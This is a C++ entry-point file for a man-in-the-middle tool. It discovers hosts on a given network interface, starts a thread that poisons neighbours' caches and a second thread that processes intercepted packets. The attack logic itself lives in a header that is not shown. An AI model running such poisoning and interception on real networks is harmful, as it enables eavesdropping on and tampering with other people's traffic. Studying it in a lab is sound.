#include <iostream>
#include <string>
#include <thread>
#include <unistd.h>
#include "../header/mitmAttack.h"

int main(int argc, char *argv[])
{
    if(argc != 2)
    {
        std::cerr << "[ERROR] main: Usage: " << argv[0] << " <interface>" << std::endl;
        return 1;
    }
    const char* interface = argv[1];
    mitmAttack mitm;
    mitm.setupSocket(interface);
    mitm.getNeighbours();
    // make a thread for poisonNeighbours
    std::thread poisonNeighboursThread(&mitmAttack::poisonNeighbours, &mitm);
    sleep(1);
    std::cerr << "[INFO] main: start processPackets" << std::endl;
    std::thread processPacketsThread(&mitmAttack::processPackets, &mitm, interface);

    poisonNeighboursThread.join();
    processPacketsThread.join();
}